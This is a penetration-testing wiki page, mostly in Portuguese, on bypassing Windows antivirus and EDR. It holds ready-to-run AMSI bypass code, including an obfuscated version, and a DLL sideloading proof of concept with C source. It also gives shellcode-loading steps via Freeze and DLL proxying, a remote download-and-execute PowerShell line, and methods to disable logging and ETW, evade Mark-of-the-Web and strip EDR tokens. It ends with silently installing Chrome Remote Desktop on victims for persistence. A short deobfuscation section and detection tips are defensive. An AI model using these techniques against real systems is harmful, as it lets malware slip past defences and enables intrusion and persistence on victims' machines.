# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para impedir que o Windows Defender funcione.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para impedir que o Windows Defender funcione, simulando outro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Atualmente, os AVs usam diferentes métodos para verificar se um arquivo é malicioso ou não: static detection, dynamic analysis, e, para os EDRs mais avançados, behavioural analysis.

### **Static detection**

Static detection é realizada sinalizando strings conhecidas maliciosas ou arrays de bytes em um binário ou script, e também extraindo informações do próprio arquivo (por ex.: descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum, etc.). Isso significa que usar ferramentas públicas conhecidas pode fazer você ser detectado mais facilmente, pois provavelmente já foram analisadas e marcadas como maliciosas. Há algumas maneiras de contornar esse tipo de detecção:

- **Encryption**

Se você criptografar o binário, não haverá como o AV detectar seu programa, mas você precisará de algum tipo de loader para descriptografar e executar o programa em memória.

- **Obfuscation**

Às vezes tudo que você precisa fazer é alterar algumas strings no seu binário ou script para passar pelo AV, mas isso pode ser uma tarefa demorada dependendo do que você está tentando ofuscar.

- **Custom tooling**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas conhecidas ruins, mas isso demanda muito tempo e esforço.

> [!TIP]
> Uma boa forma de checar a detecção estática do Windows Defender é [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele basicamente divide o arquivo em múltiplos segmentos e então manda o Defender escanear cada um individualmente; assim, pode dizer exatamente quais strings ou bytes foram sinalizados no seu binário.

Recomendo fortemente que você confira esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion na prática.

### **Dynamic analysis**

Dynamic analysis ocorre quando o AV executa seu binário em um sandbox e observa atividades maliciosas (ex.: tentar descriptografar e ler as senhas do navegador, realizar um minidump no LSASS, etc.). Essa parte pode ser mais complicada, mas aqui estão algumas coisas que você pode fazer para evitar sandboxes.

- **Sleep before execution** Dependendo de como está implementado, pode ser uma ótima forma de burlar a dynamic analysis do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo do usuário, então usar sleeps longos pode atrapalhar a análise dos binários. O problema é que muitos sandboxes dos AVs podem simplesmente pular o sleep dependendo de como foi implementado.
- **Checking machine's resources** Normalmente os sandboxes têm muito poucos recursos (ex.: < 2GB RAM), caso contrário poderiam desacelerar a máquina do usuário. Você também pode ser criativo aqui, por exemplo checando a temperatura da CPU ou até as rotações das ventoinhas; nem tudo será implementado no sandbox.
- **Machine-specific checks** Se você quer mirar um usuário cuja estação de trabalho está ligada ao domínio "contoso.local", você pode verificar o domínio do computador para ver se corresponde ao especificado; se não corresponder, você pode fazer seu programa sair.

Acontece que o nome do computador do sandbox do Microsoft Defender é HAL9TH, então você pode checar esse nome no seu malware antes da detonação; se o nome for HAL9TH, significa que você está dentro do sandbox do Defender, então pode fazer seu programa sair.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras ótimas dicas de [@mgeeky](https://twitter.com/mariuszbit) para lidar com Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev canal</p></figcaption></figure>

Como mencionamos antes neste post, **ferramentas públicas** eventualmente **serão detectadas**, então você deve se perguntar algo:

Por exemplo, se você quer dumpar o LSASS, **você realmente precisa usar o mimikatz**? Ou poderia usar um projeto diferente, menos conhecido, que também faça dump do LSASS.

A resposta correta provavelmente é a segunda. Pegando o mimikatz como exemplo, é provavelmente uma das — se não a mais — peças mais sinalizadas por AVs e EDRs; embora o projeto seja ótimo, é um pesadelo trabalhar com ele para contornar AVs, então procure alternativas para o que você está tentando alcançar.

> [!TIP]
> Ao modificar seus payloads para evadir, certifique-se de **desativar o envio automático de samples** no Defender, e por favor, sério, **NÃO ENVIAR PARA O VIRUSTOTAL** se seu objetivo é alcançar evasão a longo prazo. Se quiser checar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar o envio automático de samples e teste lá até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, **priorize usar DLLs para evasão**; na minha experiência, arquivos DLL geralmente são **muito menos detectados** e analisados, então é um truque simples para evitar detecção em alguns casos (se seu payload tiver alguma forma de rodar como DLL, claro).

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação no antiscan.me de um payload Havoc EXE normal vs um payload Havoc DLL normal</p></figcaption></figure>

Agora mostraremos alguns truques que você pode usar com arquivos DLL para ficar muito mais furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a DLL search order usada pelo loader posicionando tanto a aplicação vítima quanto o(s) payload(s) maliciosos lado a lado.

Você pode checar programas suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando exibirá a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Recomendo fortemente que você **explore DLL Hijackable/Sideloadable programs por conta própria**; essa técnica é bastante furtiva quando bem executada, mas se você usar programas Sideloadable conhecidos publicamente, pode ser facilmente pego.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não fará seu payload ser executado, pois o programa espera funções específicas dentro dessa DLL; para resolver isso, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que o programa faz da DLL proxy (maliciosa) para a DLL original, preservando a funcionalidade do programa e permitindo lidar com a execução do seu payload.

Usarei o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: um modelo de código-fonte de DLL, e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto a proxy DLL têm uma taxa de detecção de 0/26 no [antiscan.me](https://antiscan.me)! Eu chamaria isso de sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Recomendo fortemente** que você assista ao [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também ao [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais sobre o que discutimos com mais profundidade.

### Abusing Forwarded Exports (ForwardSideLoading)

Módulos PE do Windows podem exportar funções que são, na verdade, "forwarders": em vez de apontarem para código, a entrada de exportação contém uma string ASCII na forma `TargetDll.TargetFunc`. Quando um chamador resolve a exportação, o loader do Windows irá:

- Carregar `TargetDll` se ainda não estiver carregado
- Resolver `TargetFunc` a partir dele

Principais comportamentos a entender:
- Se `TargetDll` for um KnownDLL, ele é fornecido a partir do namespace protegido KnownDLLs (por exemplo, ntdll, kernelbase, ole32).
- Se `TargetDll` não for um KnownDLL, a ordem normal de busca de DLLs é usada, a qual inclui o diretório do módulo que está fazendo a resolução do encaminhamento.

Isso possibilita uma primitiva indireta de sideloading: encontre uma DLL assinada que exporte uma função encaminhada para um nome de módulo que não seja KnownDLL, então coloque essa DLL assinada no mesmo diretório que uma DLL controlada pelo atacante nomeada exatamente como o módulo alvo encaminhado. Quando a exportação encaminhada for invocada, o loader resolve o forward e carrega sua DLL do mesmo diretório, executando seu DllMain.

Exemplo observado no Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` não é um KnownDLL, então é resolvida pela ordem normal de pesquisa.

PoC (copiar e colar):
1) Copie a DLL assinada do sistema para uma pasta gravável
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque um `NCRYPTPROV.dll` malicioso na mesma pasta. Um `DllMain` mínimo é suficiente para obter execução de código; você não precisa implementar a função encaminhada para acionar `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Acione o encaminhamento com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento observado:
- rundll32 (assinado) carrega o side-by-side `keyiso.dll` (assinado)
- Enquanto resolve `KeyIsoSetAuditingInterface`, o loader segue o forward para `NCRYPTPROV.SetAuditingInterface`
- Em seguida o loader carrega `NCRYPTPROV.dll` de `C:\test` e executa seu `DllMain`
- Se `SetAuditingInterface` não estiver implementada, você receberá um erro "missing API" somente depois que `DllMain` já tiver sido executado

Hunting tips:
- Concentre-se em forwarded exports onde o módulo alvo não é um KnownDLL. KnownDLLs estão listadas em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar forwarded exports com ferramentas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Veja o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitore LOLBins (e.g., rundll32.exe) carregando DLLs assinadas de caminhos não-sistema, seguidas pelo carregamento de non-KnownDLLs com o mesmo nome base nesse diretório
- Alerta sobre cadeias de processo/módulo como: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` em caminhos graváveis por usuários
- Aplique políticas de integridade de código (WDAC/AppLocker) e negue write+execute em diretórios de aplicações

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Você pode usar Freeze para carregar e executar seu shellcode de forma furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasão é apenas um jogo de gato e rato — o que funciona hoje pode ser detectado amanhã, então nunca confie em apenas uma ferramenta; se possível, tente encadear múltiplas técnicas de evasão.

## AMSI (Anti-Malware Scan Interface)

AMSI foi criado para prevenir "[malware sem arquivo](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs eram capazes apenas de escanear **arquivos no disco**, então se você conseguisse de alguma forma executar payloads **diretamente na memória**, o AV não podia fazer nada para impedir, pois não tinha visibilidade suficiente.

A feature AMSI está integrada nestes componentes do Windows.

- User Account Control, ou UAC (elevação de EXE, COM, MSI ou instalação de ActiveX)
- PowerShell (scripts, uso interativo e avaliação dinâmica de código)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macros VBA do Office

Isso permite que soluções antivírus inspecionem o comportamento de scripts ao expor o conteúdo do script de forma não criptografada e sem ofuscação.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observe como ele antepõe `amsi:` e em seguida o caminho para o executável de onde o script foi executado, neste caso, powershell.exe

Não gravamos nenhum arquivo no disco, mas ainda assim fomos detectados em memória por causa do AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Por isso, recomenda-se usar versões mais antigas do .NET (como 4.7.2 ou inferiores) para execução em memória se você quiser evadir o AMSI.

Existem algumas maneiras de contornar o AMSI:

- **Obfuscation**

Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa forma de evadir a detecção.

No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que tenham múltiplas camadas, então a obfuscação pode ser uma má opção dependendo de como for feita. Isso torna a evasão menos direta. Embora, às vezes, tudo o que você precise fazer seja alterar alguns nomes de variáveis e isso seja suficiente, então depende de quanto algo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do powershell (também cscript.exe, wscript.exe, etc.), é possível manipulá-lo facilmente mesmo executando como um usuário sem privilégios. Devido a essa falha na implementação do AMSI, pesquisadores encontraram múltiplas maneiras de evadir a verificação do AMSI.

**Forcing an Error**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) fará com que nenhuma verificação seja iniciada para o processo atual. Originalmente isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para impedir um uso mais amplo.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tudo o que foi preciso foi uma linha de código powershell para tornar o AMSI inutilizável para o processo powershell atual.

Essa linha, obviamente, foi sinalizada pelo próprio AMSI, portanto é necessária alguma modificação para poder usar esta técnica.

Aqui está um AMSI bypass modificado que peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tenha em mente que isso provavelmente será sinalizado quando esta postagem sair, então você não deve publicar nenhum código se sua intenção for permanecer indetectado.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Por favor, leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.

Também existem muitas outras técnicas usadas para contornar o AMSI com PowerShell; confira [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**este repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para saber mais sobre elas.

Esta ferramenta [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) também gera scripts para contornar o AMSI.

**Remover a assinatura detectada**

Você pode usar uma ferramenta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a assinatura AMSI detectada da memória do processo atual. Essa ferramenta funciona escaneando a memória do processo atual em busca da assinatura AMSI e então sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use PowerShell versão 2**
Se você usar PowerShell versão 2, o AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isso:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging é um recurso que permite registrar todos os comandos PowerShell executados em um sistema. Isso pode ser útil para auditoria e resolução de problemas, mas também pode ser um **problema para atacantes que querem evitar detecção**.

Para contornar o PowerShell logging, você pode usar as seguintes técnicas:

- **Disable PowerShell Transcription and Module Logging**: você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse propósito.
- **Use Powershell version 2**: se você usar PowerShell version 2, AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para spawnar um powershell sem defesas (isso é o que `powerpick` do Cobal Strike usa).


## Obfuscation

> [!TIP]
> Várias técnicas de obfuscação dependem de encriptar dados, o que aumentará a entropia do binário e facilitará a detecção por AVs e EDRs. Tenha cuidado com isso e talvez aplique encriptação apenas em seções específicas do seu código que sejam sensíveis ou que precisem ser ocultadas.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Ao analisar malware que usa ConfuserEx 2 (ou forks comerciais) é comum encontrar várias camadas de proteção que bloquearão decompiladores e sandboxes. O fluxo de trabalho abaixo restaura de forma confiável um IL quase original que pode depois ser decompilado para C# em ferramentas como dnSpy ou ILSpy.

1.  Anti-tampering removal – ConfuserEx encripta cada *method body* e o desencripta dentro do *module* static constructor (`<Module>.cctor`). Isso também corrige o checksum do PE de forma que qualquer modificação fará o binário crashar. Use **AntiTamperKiller** para localizar as tabelas de metadata encriptadas, recuperar as chaves XOR e reescrever um assembly limpo:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
A saída contém os 6 parâmetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que podem ser úteis ao construir seu próprio unpacker.

2.  Symbol / control-flow recovery – alimente o arquivo *clean* para **de4dot-cex** (um fork de de4dot com awareness de ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleciona o profile ConfuserEx 2  
• de4dot desfará o control-flow flattening, restaurará namespaces, classes e nomes de variáveis originais e desencriptará strings constantes.

3.  Proxy-call stripping – ConfuserEx substitui chamadas diretas de métodos por wrappers leves (a.k.a *proxy calls*) para dificultar ainda mais a decompilação. Remova-os com **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Após esse passo você deve observar APIs .NET normais como `Convert.FromBase64String` ou `AES.Create()` em vez de funções wrapper opacas (`Class8.smethod_10`, …).

4.  Manual clean-up – execute o binário resultante no dnSpy, procure por grandes blobs Base64 ou uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o payload *real*. Frequentemente o malware o armazena como um array de bytes codificado TLV inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o fluxo de execução **sem** precisar executar a amostra maliciosa – útil quando se trabalha em uma estação offline.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork de código aberto da [LLVM] compilation suite capaz de aumentar a segurança do software através de [code obfuscation] e proteção contra adulteração.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, código ofuscado sem usar qualquer ferramenta externa e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações ofuscadas geradas pelo framework de metaprogramação de templates do C++, o que tornará a vida de quem tenta quebrar a aplicação um pouco mais difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador binário x64 capaz de ofuscar vários tipos diferentes de arquivos PE, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um motor simples de código metamórfico para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código de granularidade fina para linguagens suportadas pelo LLVM que utiliza ROP (return-oriented programming). ROPfuscator ofusca um programa no nível de código assembly transformando instruções regulares em cadeias ROP, frustrando nossa concepção natural de fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um Crypter de PE .NET escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicações potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicações pouco baixadas acionarão o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em More Info -> Run anyway).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) com o nome Zone.Identifier, que é criado automaticamente ao baixar arquivos da internet, juntamente com a URL de onde foi baixado.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier para um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante notar que executáveis assinados com um certificado de assinatura **confiável** **não acionarão o SmartScreen**.

Uma maneira muito eficaz de evitar que seus payloads recebam o Mark of The Web é embalá‑los dentro de algum tipo de container, como um ISO. Isso acontece porque Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em containers de saída para evitar o Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de logging no Windows que permite que aplicações e componentes do sistema **registrem eventos**. No entanto, ele também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

Similar to how AMSI is disabled (bypassed) it's also possible to make the **`EtwEventWrite`** function of the user space process return immediately without logging any events. This is done by patching the function in memory to return immediately, effectively disabling ETW logging for that process.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory has been known for quite some time and it's still a very great way for running your post-exploitation tools without getting caught by AV.

Since the payload will get loaded directly into memory without touching disk, we will only have to worry about patching AMSI for the whole process.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) already provide the ability to execute C# assemblies directly in memory, but there are different ways of doing so:

- **Fork\&Run**

It involves **spawning a new sacrificial process**, inject your post-exploitation malicious code into that new process, execute your malicious code and when finished, kill the new process. This has both its benefits and its drawbacks. The benefit to the fork and run method is that execution occurs **outside** our Beacon implant process. This means that if something in our post-exploitation action goes wrong or gets caught, there is a **much greater chance** of our **implant surviving.** The drawback is that you have a **greater chance** of getting caught by **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

It's about injecting the post-exploitation malicious code **into its own process**. This way, you can avoid having to create a new process and getting it scanned by AV, but the drawback is that if something goes wrong with the execution of your payload, there's a **much greater chance** of **losing your beacon** as it could crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.

By allowing access to the Interpreter Binaries and the environment on the SMB share you can **execute arbitrary code in these languages within memory** of the compromised machine.

The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Token stomping is a technique that allows an attacker to **manipulate the access token or a security prouct like an EDR or AV**, allowing them to reduce it privileges so the process won't die but it won't have permissions to check for malicious activities.

To prevent this Windows could **prevent external processes** from getting handles over the tokens of security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), it's easy to just deploy the Chrome Remote Desktop in a victims PC and then use it to takeover it and maintain persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).


## Advanced Evasion

Evasion is a very complicated topic, sometimes you have to take into account many different sources of telemetry in just one system, so it's pretty much impossible to stay completely undetected in mature environments.

Every environment you go against will have their own strengths and weaknesses.

I highly encourage you go watch this talk from [@ATTL4S](https://twitter.com/DaniLJ94), to get a foothold into more Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta é também outra great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

You can use [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) which will **remove parts of the binary** until it **finds out which part Defender** is finding as malicious and split it to you.\
Another tool doing the **same thing is** [**avred**](https://github.com/dobin/avred) with an open web offering the service in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
